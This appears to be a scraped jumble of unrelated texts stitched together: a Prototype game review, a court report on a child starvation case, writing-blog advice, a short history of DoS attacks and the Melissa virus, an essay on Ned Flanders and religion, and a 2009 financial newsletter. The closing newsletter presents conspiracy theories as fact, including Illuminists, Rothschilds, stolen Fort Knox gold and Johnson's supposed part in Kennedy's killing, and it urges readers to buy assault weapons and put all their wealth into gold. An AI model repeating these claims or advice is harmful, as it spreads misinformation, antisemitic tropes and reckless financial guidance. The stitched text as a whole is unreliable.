Microsoft has stated unequivocally that Windows 7 is not coming to ARM , so Nividia will have to make Windows CE work if it wants to stick with Microsoft 's platform .
You are Alex Mercer .
What exactly that means is initially unclear because this is a man who has lost his memory , but awoken in a morgue to a world in which he possesses untold power .
A viral outbreak has claimed Manhattan , forcing the island into a military quarantine .
The infected citizens are undergoing radical , monstrous changes -- none more drastic than Alex himself .
This anti-hero finds himself with the ability to shape shift and absorb other beings .
As the most powerful being on a closed island , the entire city is your playground .
And it is a game world that feels unfinished .
Click +the+image+to+watch+the+Prototype+video+review .
Did+we+mention+the+copious+amounts+of+blood ?
Prototype is a single player , open - world action game in the style of Crackdown or The Incredible Hulk : Ultimate Destruction .
You play as a man gifted with superhuman powers and the option to go most anywhere you like and do most anything you want once you get there .
It 's sandbox gaming with a heavy focus on pure action .
Though you play as a man bestowed with superhero power , Mercer is anything but heroic .
There are no moral choices here .
Mercer has vowed to destroy those responsible for his current situation and he has the means to do it .
To gain new powers or refill your health bar , you 'll literally absorb other living beings .
Find yourself a little low on hit points and you can simply grab an innocent bystander , crush his or her head , and then consume them for a quick boost .
If you find yourself in a pinch with attack choppers chasing you through the roads , you can absorb a person and morph into their likeness to blend in with the crowd .
As you work your way through the game you 'll unlock new and ever more exotic powers .
There 's an air dash and a glide move that help you quickly travel from one side of Manhattan to the other .
There 's a massive elbow drop that can destroy a tank in one hit .
There 's even a whiplash arm that can be used to latch onto passing helicopters to hijack them , Just Cause style .
These moves give Prototype
But how long can you do flying elbow drops onto tanks or throw people off of rooftops before it gets boring ?
The world itself here is far from the most engaging ... The answer to that will vary by the player , but obviously messing around with the powers is n't all there is to do in Prototype .
The storyline involves 31 missions including everything from simple seek and destroy affairs to stealthy infiltrations to escort missions and massive boss battles .
Most of these missions are standard in design .
In fact , if you 've played many open - world games , you 've probably played identical copies of these in the past .
And since repetition is oftentimes the name of the game here , you can be sure you 'll be doing uninspired tasks over and over again .
Quite often Prototype follows the design philosophy of everything and the kitchen sink .
Instead of fighting a few enemies , the game tosses dozens upon dozens at you .
Then it throws in a few tanks and helicopters as well as a couple dozen innocent bystanders for good measure .
It 's a design that creates a lot of tension , though I found the action too chaotic at times .
Even the policing system is dialed to the max and too aggressive .
You can't do something as simple as run through the city while leaping off of buildings without alerting the Strike Teams , at which point you 're forced into some shape shifting or combat .
This can make the basic act of exploration more work than it should be .
There is very little downtime to counteract the high stress of the missions .
Prototype 's design leans heavily on the fact that you can refill your health by consuming victims at any time .
Some attacks can drain half of your health bar or more .
Others juggle you in the air leaving you open to frustrating combos from enemies .
And sometimes you 'll think you 've dodged an attack only to get hit a few feet away anyway .
But it 's OK , because you can always go get more health , right ?
Not really .
The action heavy sequences involve barely surviving to the next checkpoint or running in and out of the action ad nausea trying to stay alive .
Skilled players wo n't have too much trouble , but Prototype 's chaos could quickly become overwhelming for others .
I found several points of the game to be unnecessarily aggravating to the point where I would have turned Prototype off and walked away if I were n't reviewing it .
Alongside the main quest is a set of side missions called events to tackle at your discretion .
Beat them and you earn some Evolve Points ( EP ) used to upgrade Mercer 's powers .
Radical smartly hands out EP like candy .
Complete just a mission or two and you 'll quickly find yourself spending EP to grab new powers and abilities early and often .
It 's hard to stop playing when you know you 'll get a new move by making it through just one more mission .
Unfortunately , there is n't a whole lot of variety in these events and I often found myself wishing they made better use of Mercer 's vast array of powers .
Those included here are dominated by things like checkpoint races and killing sprees -- things that have been done so often as side missions in games like this that they 're hardly worth mentioning .
It 's cookie cutter game design at this point .
There is one exception : A mission that tasks the player with gliding long distances towards a bulls - eye .
Why are n't there more imaginative events like this ?
You can throw a person hundreds of yards .
Why not include some sort of shot - put event ?
There was a real opportunity to get creative here , but instead too many of the side missions directly mirror the mindless killing or limited stealth of the main game .
Angela Gordon and Junaid Abuhamza deny murdering Khyra Ishaq
A boy in the care of a couple accused of starving a girl to death was seen trying to eat toy sandwiches in a hospital play area , a jury was told .
Angela Gordon and Junaid Abuhamza , both from Handsworth , Birmingham , deny murdering seven - year - old Khyra Ishaq .
The boy , aged eight , described as being extremely thin , " begged " for food on a hospital ward on the day Khyra died , Birmingham Crown Court heard .
He was in the couple 's care at the time they are accused of murdering Khyra .
' Some more '
The eight - year - old boy can not be named for legal reasons .
In a statement read to the court by prosecution QC Timothy Raggatt , Det Con Victoria Lee said she met the boy and four other children , who were also in the defendants ' care , at Birmingham 's City Hospital .
The child abuse investigation officer said in her statement : " He was stopping every adult on the ward , begging for food .
" He told me he had eaten toast and cereal that morning but he was desperate for some more . "
The boy started to make sandwiches from plastic children 's food in a play area and tried to eat them , the court heard .
Ms Lee said : " I had to tell him not to and take it away from him . "
The court heard that the five children being cared for at the hospital were then given sandwiches and that one of them had " concealed " two of them under her arm .
' Very frail '
The five children were initially taken to Birmingham 's Thornhill Road police station after Khyra was found dead at her home in Leyton Road , Handsworth .
In a statement made by Sgt Russell Tringham which was read to the court , the police officer described seeing the children in a kitchen area of a rest room at Thornhill Road .
He said : " They were all extremely thin in the face and the body , and looked very frail .
" ( One of the boys ) kept asking me over and over ' Can we have some more breakfast ?
Can we have some cereal ? '. "
Mr Abuhamza , 30 , of Leyton Road , pleaded guilty at the start of the trial to cruelty charges relating to five children in his care and control .
Ms Gordon , 34 , also of Leyton Road , denies the charges of child cruelty , which are alleged to have been committed between December 2007 and May 17 2008 .
The case continues .

We ’re writers , so we should write about everything , right ?
Not if we care about maintaining an audience , we should n’t .
Despite our deep - seated belief that every thing that happens to us and every thought we have is interesting to others , some things writers like to blog about are just plain boring or , worse , portray them in a negative light .
I ’ve learned most of these because I ’ve done them and driven off readers with them , so do n’t think I ’m setting these down as reminders for others .
They apply to me doubly so .
They include :
Your rejection letters .
You can use them to illustrate a point , but blogging “ rejected by F&SF , 8 days ” is n’t very interesting .
Also , it makes you look kinda like a schlub when your blog is full of rejection letters .
Your readers only need to know when you have new work coming out .
They do n’t care how many agents turned you down , or how many rejections you gathered along the way before the sale .
Your word count for the day .
Good for you , seriously .
I know some people use this as a kind of social reinforcement , but personally , I ca n’t stand looking at a blog and seeing nothing but a long list of short posts talking about what you wrote that day .
Your favorite snippet from your work - in - progress .
Out of context , it is n’t nearly as neat or interesting as you think it is .
Publish the story and we ’ll bask in the glow of your genius then .
Grammar .
Snore .
In general , the craft and daily travails of being a writer .
I firmly believe that writers should be interesting for something other than being a writer .
It ’s a rare individual who can be scintillating to the general public while talking about the sausage - making of writing . *
If you ’re a writer , surely you ’re passionate about something other than writing .
Blog about whatever that is .
Look at it this way –who is your target audience ?
The subject of writing is interesting to other writers and aspiring writers .
They are not necessarily the readers you want , because there are not very many of them .
If your goal is to collect a following greater than a few hundred people , then you need a subject of broader interest–even just the genre that you write in is more interesting than the act of writing itself .
Clearly I am not following the advice of the last point here .
I write about writing for a good reason , and that ’s because my freelance business caters to writers .
Writers are my target audience for these posts , so I am comfortable with it .
As I complete my business website , these kinds of advice posts will transition to that site , and my personal blog will become more , well , personal .
* Exempt from this advice are writers with staggering readerships , such as Neil Gaiman and John Scalzi .
ETA :
Nick Mamatas has this to say in the comments , and it ’s a strong point :
The subject of writing is interesting to other writers and aspiring writers .
They are not necessarily the readers you want , because there are not very many of them .
Crazy talk .
There are millions of aspiring writers , and thus an industry to service them — several monthly magazines , a plethora of how - to books , seminars and conferences , over 100 degree - granting programs in the subject , etc .
Aspiring writers also tend to read more widely ( and deeply ) than non-aspirants .
Aspiring writers are certainly a large audience worth cultivating .
So I took this advice much further than I should have .
And I should point out that my advice was aimed squarely not at writers who blog as a kind of personal journal .
I aim it at people who are looking to deliberately and methodically grow an audience .
If you ’re writing a personal journal style blog , but want to use your blog to grow an audience , I thnk you need to think about transitioning the kind of content you post .

Before I even got my driver ’s license , I was an intern at a heavy metal magazine , and had the pleasure to write feature stories , critique album reviews , go to shows three times a week , and hang out with my favorite bands .
Nothing surprised or shocked me ( I was interviewing Marilyn Manson in his dressing room for a feature story , enough said ) and I liked it that way .
So , it ’s no wonder that when I got out of college , and I needed a job , that a prominent porn magazine came calling .
As the managing editor , I oversaw the articles , wrote a good portion of them , and conducted reviews of upcoming DVDs .
I have to say , I had a great time .
I was surrounded by the coolest , smartest , most hardworking people in any publication .
I had a job that could pay the bills and then some .
It was different , funny , sexy , and …

Worried that an important loan - guarantee program has ground to a standstill , renewable energy industry associations sent a letter on Wednesday to President Obama urging him to speed the program along .
The signers represented virtually every type of clean energy — wind , solar , geothermal , hydro , nuclear , combined heat and power , and biomass — and reflected the industry ’s concern that a loan guarantee program for clean energy projects approved in the stimulus package was stuck in the federal bureaucracy , as has been a similar loan program that predates the stimulus .
The letter , seen by Green Inc , cited “ disagreements ” between the Department of Energy and the Office of Management and Budget over regulations to carry out the loan guarantees .
Three months have gone by since the stimulus packaged passed , the letter stated , “ and we have little confidence that ongoing discussions between D.O.E. and the Office of Management and Budget over these regulations will produce a satisfactory result in a timely manner . ”
“ With access to these loan guarantees , ” the letter continued , “ our member companies will be able to start construction of planned projects that would otherwise need to be delayed or canceled due to current capital market conditions . ”
Vice President Joseph Biden and the White House chief of staff , Rahm Emanuel , were sent copies of the letter , as were Energy Secretary Steven Chu ; Peter Orszag , director of the Office of Management and Budget ; and several other senior officials .
Renewable energy companies have suffered from the difficulties in the banking sector , which had been their primary source of financing .
The loan guarantee program has been viewed as an important tool for restarting activity in the clean energy sector .
However , in four years , the Department of Energy has tentatively awarded only one loan guarantee — in March , to a solar company .
Mr. Chu has stated that the loan guarantee program is a priority , but the industries clearly remain concerned about regulatory hurdles .
The letter recommends ways to speed the program forward .

This is the basic idea behind denial - of - service attacks : to render a computer resource unavailable to its intended users , often by simply flooding the target system with ping requests .
These attacks have become increasingly ubiquitous , largely because they are relatively easy to execute .
Below is a brief history of fascinating and noteworthy DoS and DDoS ( distributed denial - of - service ) attacks .
The results reveal a surprising evolutionary trend : where the earliest incidents were generally launched for fun or profit , contemporary DoS attacks have become prominent means of protest and dissent .
2 Nov 1988 : the Morris worm , written by Cornell CS grad student Robert Morris , was the very first significant DoS attack .
Morris put roughly 5000 machines out of commission for several hours .

Once it penetrated a computer , Melissa gained access to Microsoft Outlook and began self - replicating , mailing itself to the infected user ’s correspondents .
Because of the virus ’ rapid rate of replication , many email systems were overwhelmed by the traffic ; Melissa ultimately incapacitated the email networks of over three hundred U.S. corporations .

Here are some steps that should get you on your way .
I HAVE an article in today 's ( London ) Times arguing that Ned Flanders has beaten his fellow moustache - wearer , Friedrich Nietzsche , in the struggle to define modernity .
The most risible thing about Flanders , of course , is his bulletproof Christian faith .
Equipped with a degree from Oral Roberts University , and a simple - minded optimism , Flanders is arguably America 's best - known Christian .
Indeed , Christianity Today once suggested that he is more famous , on campuses and in schools , than the Pope , Mother Teresa or Billy Graham .
There are few more easily ridiculed characters in TV - land than Ned Flanders , the cartoon character who has the misfortune to live next door to Homer Simpson .
He has a silly moustache !
He wears jumpers !
His first name is Nedward !
No wonder we all smile with approval as Homer subjects him to one humiliation after another .
Flanders gets off lightly compared with other celluloid evangelicals .
Evangelicals may make up a third of the US population , but this is one minority that Hollywood has no time for .
Ever since Elmer Gantry , the phrase “ evangelical preacher ” has been a shorthand for hypocrite .
Most evangelicals are portrayed as murderers , rapists and sexual perverts with a consistency that , if they were black or Jewish , would get the American Civil Liberties Union into a lather .
In Cape Fear , the antihero is a deranged Pentecostal who goes down to his watery death singing hymns .
In O Brother , Where Art Thou ? , an itinerant Bible salesman beats his kindly benefactors with a piece of wood and steals their money .
Even the James Bond franchise got in on the act , casting a megapreacher as a ( lecherous , of course ) frontman for a cocaine cartel in The Living Daylights .
The sins of Flanders are of a much milder sort .
The owner of the Leftorium store for left - handed people is occasionally ridiculed for being intolerant .
He once participated in a walk “ for the cure of homosexuality ” ; he tried to baptise Bart and Lisa without their consent , with predictable results .
But for the most part he is simply ridiculed for being , well , ridiculous .
What other response could we have for a man who owes his success in life to the three Cs : “ Clean living , chewing thoroughly and a daily dose of vitamin Church ” ?
But is Ned really such a loser ?
Look around the world and you find that risible old Nedward - or at least the phenomenon he epitomises - has won one of the great intellectual battles of the past two centuries .
And now , far from being put down , Flanderism is spreading around the world , an American export with a potency at least the equal of the very Hollywood products that mock him .
The great battle has to do with religion and modernity .
Ever since the Enlightenment , intellectuals have predicted that religion - and particularly the effusive brand of religion now practised by evangelicals - would be doomed by modernity .
The high priests of the Enlightenment mocked Christianity as a refuge for superstitious freaks .
Edward Gibbon was never happier than when chronicling the absurd activities of the likes of Saint Simeon Stylites , who for more than 30 years lived on top of a pillar 21 m ( 70 ft ) high and 1 m square .
In his novel La Religieuse Diderot mocked the religious for their psychological oddities and deviant pastimes , not least flagellation .
The founders of modern sociology , Max Weber and Émile Durkheim , predicted the secularisation of the world .
Ned 's fellow moustache - wearer , Friedrich Nietzsche , loudly announced God 's death .
Marx cursed the opium of the people .
Freud saw religion as a mere neurosis .
Ever since Darwin , educated European thought has viewed religion as a dying cult - the refuge of the ignorant , the superstitious and a few guilt - ridden Catholic novelists such as Graham Greene and Evelyn Waugh .
The land of Ned and Homer , of course , has always been different .
While the French slaughtered priests during their revolution , seeing religion as a bulwark of the ancien régime , America 's Founding Fathers separated Church from State , in large part to protect the former from the latter .
The First Amendment set off a fierce competition between America 's “ multiplicity of sects ” , with a succession of evangelising religions vying for people 's attentions : the Methodists converted an eighth of the country within a generation of the revolution .
While Europe 's state - sponsored religions shrivelled , America 's free market kept faith alive .
That has not stopped most American intellectuals continuing to bet that eventually their country would give in to the same acids of modernity as Europe .
In 1959 , C. Wright Mills argued , in The Sociological Imagination , that “ in due course , the sacred shall disappear altogether , except , possibly , in the private realm ” .
In its 1966 Easter issue , Time magazine asked “ Is God Dead ? ” on its cover .
In the same year , Thomas Altizer , a theologian , published to much acclaim The Gospel of Christian Atheism .
In 1968 , Gallup found that 67 per cent of Americans believed that religion was losing its impact on society .
In 1988 Tom Wolfe told students at Harvard , not entirely happily , that they lived in an era of “ freedom from religion ” .
The theory was ( and remains in a few places - just read The New York Times or visit Cambridge , Massachusetts ) that America was the exception , not the rule .
Under this logic , Ned Flanders was the religious equivalent of the duck - billed platypus , a creature ill equipped for the modern world who has somehow survived extinction .
Rational America , went the theory , would gradually ditch such superstitions ; religion would survive only with the weak , the poor and the stupid .
True to that picture , ever since the Scopes “ monkey ” trial in Tennessee , where a bunch of them were exposed as crude evolution - deniers , American evangelicals have been regarded as bigoted buffoons ,
But that picture is beginning to change - and the argument is beginning to swing from Nietzsche to Ned Flanders .
At the grandest level , sociologists are wising up to having made “ a category mistake ” .
That is the term used by Peter Berger , the dean of the subject .
He points out that academics used to associate modernity with secularisation ; in fact the really modern thing is pluralism .
The ability to choose your religion lies at the heart of the American model .
The latest figures show that one American in four has swapped faiths in his or her life .
Pluralism can certainly mean that some people choose not to be religious : the number of atheists in America has jumped nearly 10 percentage points to 16 per cent in the past two decades ( prompting a cover of Newsweek dedicated to “ The Decline and Fall of Christian America ” ) .
On the other hand the same figures also show a rise in the number of committed evangelicals and of Pentecostals .
Three quarters of Americans - the most advanced country on the planet - still describe themselves as Christians .
Look around the Christian world and the religious ecology is moving in an American direction .
Established Churches are losing their monopoly .
New market entrants are advancing the principles of competition and choice .
Ned Flanders is not a man who likes to leave Springfield ( his only known excursion out of town , to Las Vegas with Homer , ended in disaster ) .
But if Ned were to venture abroad he would find plenty of people like himself - in churches the size of football stadiums across Latin America , in 4,850 ha ( 12,000 - acre ) “ redemption camps ” in Nigeria , in storefront churches in the slums of Rio and Guatemala City , in brick - and - mud tabernacles with metal roofs and dirt floors in rural South Africa .
Virtually everywhere in the developing world fiery preachers are preaching a faith that would appeal to Ned Flanders : live your life according to God 's law , read the Bible as the literal word of Truth , treat your neighbour as yourself .
And everywhere they are thriving .
In 1900 , 80 per cent of the world 's Christians lived in Europe and the United States ; today , 60 per cent of them live in the developing world .
States that were once committed to enforcing secularism are now facing religious revivals .
In Russia , 86 per cent of the population identify themselves as Christians ; but the most remarkable example of Flanderism can be found in China 's house churches .
We recently visited an apartment in a well - heeled district of Shanghai , where a technology executive hosted two dozen clever young Chinese , including several CEOs , a well - known academic and a stem - cell researcher .
They spent three hours studying one letter from St Paul .
Soon their church will get too big : it will cross the 25 - person limit for unauthorised meetings , or one of the neighbours will complain about the hymns or the people hogging the parking spaces .
So the church will have to split , guaranteeing its growth .
China is well on its way to being the world 's biggest Christian country : there are at least 80 million Christians and already more people go to church every week than are members of the Communist Party .
Even Europe is showing some signs of abandoning secularisation .
The most obvious sign of this , of course , is the rise of European Islam , driven by one of the greatest mass migrations in history .
But there is more to it than this .
Some of the immigrants are Christians .
Evangelical Christianity and charismatic Catholicism are both on the rise , albeit from small bases .
Some two million people have taken the Alpha course - a sort of Anglican version of Rick Warren 's Purpose Driven Life .
As for politics , Tony Blair 's press secretary , Alastair Campbell , famously said that the Prime Minister “ did not do God ” .
Nowadays Blair , who runs a religious foundation , spends the bulk of his time “ doing God ” .
France , the home of laïcité , is now led by Nicolas Sarkozy , who has written a book arguing that religion should be given more of a role in the public square .
Why is religion enduring ?
One reason is that even if Homer ( the Greek one , not his Springfield namesake ) exaggerated when he said that “ all men have need of the Gods ” , some men ( and even more women ) clearly do .
Some people have always looked to religion to provide life with meaning and purpose .
Today it is secular Europe that looks like the exception .
Berger jokes that , rather than studying evangelicals like Flanders , sociologists would be better employed studying Swedes and university professors , because they are the historical oddities .
Moreover , the forces of modernity are clearly helping religion .
The sort of churches that Flanders belongs to are past - masters at using every new piece of technology and every advance in managerial wisdom to spread the word : megachurches have segmented and re-segmented the American market .
Now Christian America is doing the same for the world , with its pastorpreneurs preaching to hundreds of thousands of people ( in 2005 , T.D. Jakes delivered two sermons at Nairobi's Uhuru Park that attracted an estimated crowd of a million people ) or devoting their lives to helping the world 's poor ( there are more than 100,000 full - time American missionaries around the world ) .
Rick Warren points out that churches have one of the world 's greatest infrastructures : there are “ a million villages around the world that do n't have a school , a clinic , a hospital , a fire department or a post office ... but have got a church ” .
Warren 's own church , Saddleback , sends hundreds of missionaries a year to Africa .
He distributes a clinic - in - a - box , a portable supply of medicine that people in isolated villages are trained to dispense .
His kit also includes a school - in - a - box , a business - in - a - box and a church - in - a - box .
“ We 've got more volunteers than anybody else , ” Warren says .
“ Government does n't have a billion volunteers .
Business does n't have a billion volunteers . ”
Ned Flanders 's enthusiasm for helping his neighbour has gone global .
That is plainly not always a good thing .
The global revival of faith has engendered religious conflict as well as good works : go to Nigeria and you will find a blood - spattered struggle between conservative Christianity , funded by Ned 's collection - plate money , surging northwards , and fundamentalist Islam , backed by Saudi money , pushing southwards .
Even in more peaceful places , evangelical missions sometimes spend more time trying to convert poor people than trying to help them .
As everywhere else , religion is capable of bad as well as good .
But even allowing for that , something remarkable is happening .
Some newly religious people around the world are scared and weak : religion is a storm shelter against globalisation ( certainly in many of Islam 's Arab heartlands ) .
But for an increasing number of people , religion is a tool of upward mobility ; many of the Indians flocking to the Hindu BJP , and Turks joining the Islam - orientated AKP , are the sort of bourgeoisie that Nehru and Ataturk wanted to create .
This seems to be especially true of US - style Christianity .
In the Chinese house church , religion is seen as an essential guide to profiting from globalisation .
The bookshops in megachurches in the developing world are stocked with books on management and self - help .
This ties in to the final reason why the Flanders - as - loser stereotype is wrong : evangelicals are doing rather well for themselves .
There seems to be a link between religiosity and upward economic mobility in the US .
That is partly because the heartland of evangelical America , the South , has been booming .
But other things seem to be at work .
Jonathan Gruber , a secular - minded economist from the Massachusetts Institute of Technology and an alumnus of the Clinton Administration , has even argued , on the basis of a mass of evidence , that church - going produces a boost in income .
To summarise a complex argument : a 10 per cent increase in the density of people from the same religious group living in the same neighbourhood leads to an 8.5 per cent rise in church - going , and a 10 per cent increase in the density of co-religionists leads to a 0.9 per cent rise in income .
There is also considerable evidence that , regardless of wealth , Christians are healthier and happier than their secular brethren .
David Hall , a doctor at the University of Pittsburgh Medical Centre , maintains that weekly church attendance can add two to three years to your life .
A 1997 study of 7,000 older people by the Duke University Medical Centre found that religious observance might enhance immune systems and lower blood pressure .
In 1992 there were only three medical schools in the United States that had programmes examining the relationship between spirituality and health ; by 2006 , the number had increased to 141 .
One of the most striking results of the Pew Forum 's regular survey of happiness is that Americans who attend religious services once or more a week are happier ( 43 per cent very happy ) than those who attend monthly or less ( 31 per cent ) or seldom or never ( 26 per cent ) .
White evangelical Protestants of the Flanders variety are more likely to report being very happy than white mainline Protestants : 43 per cent compared with 33 per cent .
The correlation between happiness and church attendance has been fairly steady since Pew started the survey in the 1970s ; it is also more robust than the link between happiness and wealth .
Attending church weekly , rather than not at all , has the same effect on people 's reported happiness as moving from the bottom quartile to the top quartile of income distribution - and is a lot easier to do .
Religion can combat bad behaviour as well as promote wellbeing .
Twenty years ago , Richard Freeman , a Harvard economist , found that black youths who attend church were more likely to attend school and less likely to commit crimes or use drugs .
Since then , a host of further studies , including the bipartisan 1991 National Commission on Children , have concluded that religious participation is associated with lower rates of crime and drug use .
JamesQ.Wilson , perhaps America 's pre-eminent criminologist , summarises a mountain of evidence from the social sciences succinctly : “ Religion , independent of social class , reduces deviance . ”
Evangelicals have also caught up with much of the rest of America in terms of their education .
Over the past 30 years the proportion of evangelicals earning at least a college degree has increased by 133 per cent - more than any other religious tradition .
Enrolment in evangelical colleges grew by 60 per cent in 1990 - 2002 at a time when the general college population was static .
Evangelicals are also breaking out of the “ holy cocoon ” and becoming more familiar figures on Ivy League and other elite campuses .
Michael Lindsay , a sociologist at Rice University , calculates that about 10 per cent of the undergraduate body is regularly involved in evangelical groups .
The rise in the proportion of evangelicals is partly an unexpected ( and , for many liberal professors , a no doubt unwelcome ) by - product of the campus 's obsession with diversity .
At Yale , for example , 90 per cent of the members of the Campus Crusade are Asian - Americans .
In 1994 Mark Noll published a wonderful little book called The Scandal of the Evangelical Mind , which lamented the absence of an evangelical intelligentsia .
But since then the scandal has diminished somewhat , not least because of the work of a remarkable group of evangelical historians such as Noll .
Evangelicals are finally recognising the virtue of C.S.Lewis 's observation that “ God is no fonder of intellectual slackers than of any other slackers . ”
The Conference on Christianity and Literature has a membership of more than 1,000 and publishes a journal and monographs .
The Society of Christian Philosophers is one of the largest sub -groups in American philosophy .
Books & Culture is an evangelical version of The New York Review of Books .
In his own way , Flanders is not a bad advertisement for the advantages of his creed .
He has a spectacular physique despite apparently being in his sixties ( by contrast Homer , beer - bellied and saggy - eyed , is a walking heart attack ) .
When Ned 's Leftorium shop for left - handed people totters on the edge of bankruptcy , the Springfield community , led by Homer himself , rallies around to save him .
True , he has an absurd smile - and he smiles a lot .
But then he has a lot to smile about .
There is his conviction that his soul has been saved .
There is Homer .
And there is the fact that the world is headed in his direction , not Nietzsche's .
Somewhere in Hell , or whatever purgatory is reserved for European thinkers , a moustachioed German is looking up at The Simpsons , hitting his head and saying : “ D'oh ! ”
Bob Chapman | May 30 , 2009
What we are about to tell you may be the most important information that we have imparted in almost 50 years .
something very bad is looming – we do n’t know the exact configuration yet , but we think the key is the collapse of the dollar , which will send gold and silver to considerably higher prices .
These events could unfold over the next 2 to 4 months .
There could be devaluation and default of the US dollar and American debt .
You must have at least a 6 - month supply of freeze dried and dehydrated foods , a water filer for brackish water , and assault weapons with plenty of ammo and clips .
You should put as much of your wealth as you can in gold and silver coins and shares .
You should not own any stocks in the stock market except gold and silver shares , you should not own bonds the exception being Canadian government securities , you should not own CDs , cash value life insurance policies and annuities .
And , needless to say , except for your home you should be totally out of real estate , residential and commercial because it will remain illiquid for many years to come .
Continue to pay your normal debts down because we do not know how they will be treated when we arrive at devaluation and default .
We certainly do n’t want to have to tell you this , but the way things are shaping up it does n’t look good .
As we write this the dollar is breaking 80 on the USDX .
Interest rates are climbing , and have broken out to the upside .
Gold and silver are poised to break into new high territory and the stock market is preparing to retest 6,600 on the Dow .
You have been warned , act accordingly .
The Chinese and Russians are the laughing stock of the US and European Illuminists at the G - 20 meetings concerning talk about a new world reserve currency to supplant the dollar .
With China 's gold reserves of about a thousand tons and Russia 's five hundred tons , they are like penny ante poker players trying to get in on a thousand dollar ante game .
They need five to ten thousand tons of gold reserves just to be an average player in " The Big Game , " much less a leading and influential player .
The rest of their foreign exchange reserves are denominated in fiat currencies , which are all practically worthless except for the euro and Swiss franc .
The euro has about 5 % backing of gold and the Swiss could have 25 % backing if they again desired gold backing .
China has about two trillion dollars worth of foreign exchange reserves , while Russia has about 400 billion dollars worth .
It does not take a math genius to figure out that two trillion times nothing is still nothing .
They are creditors who hold worthless bonds and notes .
Big deal .
Their only trump card is that they can make gold skyrocket and the dollar tank before the Illuminists are ready to take our financial system down .
This is where their real leverage lies .
The talk about yuan and rubles as part of a world currency basket is just noise , like a bunch of clanging cymbals making cacophonous sounds , because they have very little gold backing .
At best , unless China and Russia add many thousands of tons of gold to their reserves to back up their currencies , the yuan and ruble will get some regional play , as a run-up to a world currency .
This is just hubris to distract us from the true agenda , which is the formation of a single world currency .
While gold suppression is the Fed and the US Illuminists ' number one priority , it is not their number one problem .
So what is their primary problem ?
It is how to transition from the dollar to a world currency without losing too much of the powers and privileges that can only be attained by having sole control over the world 's reserve currency .
They can't figure out how to share this power with the other Illuminist enclaves in setting up a new world currency without substantially reducing their own power .
This is a conundrum for them .
China and Russia are both well aware that they must acquire substantially more gold if they want to have any say on the matter of a world currency .
The trick is , how to acquire new gold reserves without sending gold on a moon - shot or causing harm to the dollar by dumping dollars for gold .
This is the opposite of what the Fed and US Treasury want , at least for now , until they are ready to take the system down to pave the way for a world currency and a one world government .
So the Chinese and Russians are now at loggerheads with the US and European Illuminists .
What China and Russia need to do in their own best interests is an anathema to the Fed and the US Treasury .
This may explain the IMF gold sale rumors .
China wants more gold , and this would be a way to grab a large chunk without running the gold price up , which would make the Fed go ballistic .
The US and European Illuminists are also in a cat fight , because the European enclave controls more gold than the US elitists , so naturally they do not believe that the system of dollar hegemony , and all the privileges that go with it , should be continued any longer
You might be tempted to think that , in reality , the US gold reserves and , for that matter , central bank gold reserves around the world , are not what the central banks claim them to be , due to leasing and outright sales , so the US and European Illuminists are in no better position than the Chinese and Russians with respect to the debate about a new world reserve currency .
You would be dead wrong if you thought that .
Why , you might ask ?
Let 's discuss that .
Never mind that the roughly eight thousand tons of US gold is stolen or hypothecated , because the US and European Illuminists stole a large portion of it , or they bought it at fire - sale prices and still have it in their secret vaults in Switzerland and off - shore in safe - haven countries .
Who do you think was doing all the buying during the London Gold Pool of the late 1960's , just for starters , which was fueled by Fort Knox gold provided courtesy of President Johnson , who was an elitist bootlicker and one of the most evil men of the 20th century ?
Why do you think US coin melt from the Depression is showing up in London gold vaults ?
Rumors still abound that the Rockefellers , with President Johnson 's help , stole a large portion of the Fort Knox gold during the London Gold Pool days , and those rumors could well be true based on what we have heard from some of our subscribers who used to work at Fort Knox .
Could that explain why one of Rockefeller 's secretaries , who blabbed about them acquiring some of the US gold , " accidentally " fell out of a high rise building ?
Could it be that President Johnson was grateful for Rockefeller 's help in eliminating the pesky President Kennedy when he tried to put their precious Fed out of business via Executive order 11110 ?
We 'll let our subscribers decide !
The same is true for the European gold holdings and the holdings of other central banks around the world , which are a fraction of what they claim , perhaps with as little as five thousand tons remaining out of some thirty thousand tons officially claimed by all central banks , including the privately owned US central bank , the Fed , via its so - called gold certificates , which are claims on the US Treasury gold .
Rest assured that much of this gold was leased out and sold not just to jewelers , but to the US and European Illuminists as well .
In addition , much of this central bank gold was either pilfered outright , or was virtually given away by people like Gordon Brown of England , the King of Fire - Sale Gold , who sold half of the UK national gold reserves to the Rothschilds and other Illuminists at the bottom of the gold market .
The remainder of the UK gold reserves is probably leased out and gone to oblivion like the US gold .
The people in the UK are minus eight billion and counting on that one , while the Rothschilds are on the plus side of that equation .
And who do you think were buying a large portion of the gold sold under the Washington Agreement and its various renewals ?
We 'll give you three guesses .
And who owns all the secret gold that has been stolen in various wars , conquests , pogroms , genocides and religious inquisitions over the many centuries , that do n't show up in the World Gold Council 's figures ?
And who owns all the scrap gold that was melted down in the last gold craze of the late 1970's and early 1980 's for which no records were kept ?
And who owns all the old investment gold held by families of old wealth that was secretly moved from the US to Europe after the Great Depression on a tip - off from FDR that he was going to render gold ownership illegal in the US .
They got a nice profit when FDR bumped the gold price from $ 20 an ounce to $ 35 dollars an ounce , did n't they ?
Who owns all this unaccounted for gold .
Again , we 'll give you three guesses .
We can assure you that it is more than the 2 % unaccounted for by the World Gold Council .
Then there is the 26,500 tons of gold which the World Gold council allocates to private investment .
Just who do you think most of those private investors are anyway ?
They are US and European Illuminists , that 's who .
They own tens of thousands of tons .
Either they own it , or their central banks own it .
The US and European Illuminists can shuffle their gold back and forth between themselves and their central banks as they see fit , since none of them are ever meaningfully audited .
So if the Chinese and Russians want to play in this high stakes game , they need to buy lots of gold , and very quickly .
The window of opportunity to buy gold on the cheap has already closed .
Hyperinflation is on its way .
They are too late to the cheap gold party .
Buy gold now , before China and Russia try to accrue the amount of the gold required to ante up in " The Big Game " so they can have a say on the new world economy that will emerge in the aftermath of the current catastrophe .
China is caught in a dollar trap .
If they try to unload dollars , they destroy the remainder of their holdings , so they have to keep vacuuming up a large portion of the dollars that are being dumped in the form of treasury bonds to support criminal zombie bank bailouts and rampant socialistic welfare spending which the US government euphemistically calls a stimulus package .
If China does n't keep sucking up dollars , the US will have to monetize more and more treasury bonds to " save the economy , " which is another euphemism for the socialization of Wall Streets losses courtesy of the US taxpayer .
The top 19 banks , including the legacy banks , get all the money they want to shore up balance sheets and to take over the smaller fry , while the smaller fry get nothing , not even loans from the larger criminal zombie institutions who can't wait until they fail so they can absorb them at pennies on the dollar .
The Fed now determines which financial institutions live or die by bestowing taxpayer largesse on who they may , but heaven forbid that they should have to account for what they are doing with that largesse .
We need to audit and end the Fed , just as Ron Paul has requested via new legislation that is getting ever more sponsors .
